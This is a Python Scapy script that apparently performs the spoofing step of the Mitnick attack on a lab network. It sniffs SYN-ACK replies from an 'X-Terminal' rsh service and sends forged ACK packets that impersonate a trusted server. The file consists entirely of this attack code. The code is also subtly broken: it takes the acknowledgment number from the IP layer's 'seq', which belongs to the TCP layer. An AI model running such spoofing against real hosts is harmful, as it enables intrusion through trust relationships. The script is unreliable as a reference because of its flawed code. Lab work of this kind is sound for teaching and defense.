#!/usr/bin/env python3

from scapy.all import IP, TCP, send, sniff

X_IP = "192.168.12.5"  # X-Terminal
X_PORT = 514  # Port used by X-Terminal

SRV_IP = "192.168.12.6"  # Trusted server
SRV_PORT = 1023  # Port used by trusted server


def spoof_pkt(pkt):
    seq = 123456789 + 1
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]

    tcp_len = old_ip.len - old_ip.ihl * 4 - old_tcp.dataofs * 4
    print(
        "{}:{} -> {}:{} Flags={} Len={}".format(
            old_ip.src,
            old_tcp.sport,
            old_ip.dst,
            old_tcp.dport,
            old_tcp.flags,
            tcp_len,
        )
    )

    # Construct the IP header of the response.
    if old_tcp.flags == "SA":
        print("sending spoofed ACK packet to the X-Terminal (Victim)")
        ip = IP(src=SRV_IP, dst=X_IP)
        tcp = TCP(
            sport=SRV_PORT,
            dport=X_PORT,
            flags="A",
            seq=seq,
            ack=old_ip.seq + 1,
        )
        send(ip / tcp, verbose=0)


sniff(filter=f"tcp and src host {X_IP}", prn=spoof_pkt)
